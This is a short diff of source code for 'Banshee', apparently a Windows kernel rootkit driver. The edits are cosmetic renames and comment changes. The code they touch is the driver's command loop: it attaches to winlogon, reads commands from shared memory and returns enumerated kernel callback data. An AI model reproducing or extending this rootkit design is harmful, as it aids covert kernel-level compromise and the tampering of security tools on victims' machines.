@@ -112,12 +112,17 @@ BeUnload()
     return STATUS_SUCCESS;
 }
 
+/*
+ * @brief Main loop function that waits for commands and executes corresponding actions.
+ *
+ * @param[in] StartContext Unused parameter.
+ */
 VOID
 BeMainLoop(PVOID StartContext)
 {
     UNREFERENCED_PARAMETER(StartContext);
 
-    KAPC_STATE apc;
+    KAPC_STATE Apc;
 
     while (!BeGlobals::Shutdown)
     {
@@ -134,10 +139,10 @@ BeMainLoop(PVOID StartContext)
         //
         // Read command payload
         //
-        KeStackAttachProcess(BeGlobals::winLogonProc, &apc);
+        KeStackAttachProcess(BeGlobals::winLogonProc, &Apc);
         BANSHEE_PAYLOAD payload = *(BANSHEE_PAYLOAD*)BeGlobals::pSharedMemory;
         LOG_MSG("Read: %d\n", payload.cmdType);
-        KeUnstackDetachProcess(&apc);
+        KeUnstackDetachProcess(&Apc);
         
         //
         // Execute command
@@ -164,7 +169,7 @@ BeMainLoop(PVOID StartContext)
                 //
                 // Write answer: copy over callbacks
                 //
-                KeStackAttachProcess(BeGlobals::winLogonProc, &apc);
+                KeStackAttachProcess(BeGlobals::winLogonProc, &Apc);
                 for (auto i = 0U; i < cbData.size(); ++i)
                 {
                     memcpy((PVOID)&(*((BANSHEE_PAYLOAD*)BeGlobals::pSharedMemory)).callbackData[i], (PVOID)&cbData[i], sizeof(CALLBACK_DATA));
@@ -174,7 +179,7 @@ BeMainLoop(PVOID StartContext)
                 // Write amount of callbacks to ulValue
                 //
                 (*((BANSHEE_PAYLOAD*)BeGlobals::pSharedMemory)).ulValue = (ULONG)cbData.size();
-                KeUnstackDetachProcess(&apc);
+                KeUnstackDetachProcess(&Apc);
             }
 
             bansheeStatus = STATUS_SUCCESS;
@@ -200,9 +205,9 @@ BeMainLoop(PVOID StartContext)
         //
         // Write answer
         //
-        KeStackAttachProcess(BeGlobals::winLogonProc, &apc);
+        KeStackAttachProcess(BeGlobals::winLogonProc, &Apc);
         (*((BANSHEE_PAYLOAD*)BeGlobals::pSharedMemory)).status = bansheeStatus;
-        KeUnstackDetachProcess(&apc);
+        KeUnstackDetachProcess(&Apc);
 
         //
         // Set answer event
@@ -218,8 +223,9 @@ BeMainLoop(PVOID StartContext)
 /**
  * Banshees driver entrypoint.
  *
- * @param pDriverObject Pointer to the DriverObject.
- * @param pRegistryPath A pointer to a UNICODE_STRING structure that specifies the path to the driver's Parameters key in the registry.
+ * @param[in] pDriverObject Pointer to the DriverObject.
+ * @param[in] pRegistryPath A pointer to a UNICODE_STRING structure that specifies the path to the driver's Parameters key in the registry.
+* 
  * @return NTSTATUS status code.
  */
 NTSTATUS
@@ -267,10 +273,11 @@ BansheeEntry(
 }
 
 /**
- * Driver entrypoint.
+ * @brief Driver entrypoint.
  *
- * @param pDriverObject Pointer to the DriverObject.
- * @param pRegistryPath A pointer to a UNICODE_STRING structure that specifies the path to the driver's Parameters key in the registry.
+ * @param[in] pDriverObject Pointer to the DriverObject.
+ * @param[in] pRegistryPath A pointer to a UNICODE_STRING structure that specifies the path to the driver's Parameters key in the registry.
+* 
  * @return NTSTATUS status code.
  */
 EXTERN_C
